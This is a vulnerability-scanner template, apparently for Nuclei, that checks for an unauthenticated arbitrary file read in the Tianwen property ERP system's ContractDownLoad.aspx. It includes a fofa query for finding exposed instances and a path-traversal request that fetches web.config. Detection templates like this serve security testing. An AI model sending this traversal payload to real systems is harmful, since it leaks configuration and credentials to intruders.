id: tianwenEPR-ContractDownLoad-File-reading

info:
  name: 天问物业ERP系统 ContractDownLoad.aspx 任意文件读取漏洞
  author: unknown
  severity: high
  description: |-
    fofa: body="天问物业ERP系统" || body="国家版权局软著登字第1205328号" || body="/HM/M_Main/frame/sso.aspx"
    天问物业ERP系统 ContractDownLoad.aspx 接口处存在任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/140708470
  tags: File reading

http:
  - raw:
      - |
        GET /HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile=../web.config HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<?xml version="1.0"'
      - type: status
        status: 
          - 200